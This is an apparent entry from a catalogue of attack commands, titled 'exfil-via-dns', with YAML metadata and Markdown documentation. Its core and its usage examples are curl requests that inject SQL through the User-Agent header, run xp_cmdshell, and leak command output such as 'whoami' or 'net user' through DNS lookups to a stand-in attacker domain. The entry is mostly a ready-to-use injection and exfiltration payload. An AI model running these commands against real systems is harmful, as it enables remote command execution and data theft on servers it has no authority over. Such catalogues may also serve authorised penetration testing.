---
data: >-
  curl -X POST $TARGET -H "User-Agent: '; EXEC xp_cmdshell 'nslookup
  $OUTPUT.attacker-dns.com';--" -d "username=test&password=test"
tags:
  - exfiltration
  - dns
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:20.403Z'
id: 1c351b92-9ab8-480b-b19c-8e0c9fdcc3d9
verified: false
validated: true
submitted: true
---
# exfil-via-dns

## Command

```bash
curl -X POST $TARGET -H "User-Agent: '; EXEC xp_cmdshell 'nslookup $OUTPUT.attacker-dns.com';--" -d "username=test&password=test"
```

## Description

Triggers DNS query from server to exfiltrate command output via subdomain.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $TARGET | Target URL | Yes |
| $OUTPUT | Encoded output (e.g., whoami result) | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://target.com/login -H "User-Agent: '; EXEC xp_cmdshell 'nslookup whoami.attacker-dns.com';--" -d "username=test&password=test"
```

### Advanced Usage

```bash
curl -X POST https://target.com/login -H "User-Agent: '; EXEC xp_cmdshell 'nslookup $(net user).attacker-dns.com';--" -d "username=test&password=test"
```

## Expected Output

HTTP response; check DNS server logs for query.

## Related

- [[Related Procedure]]
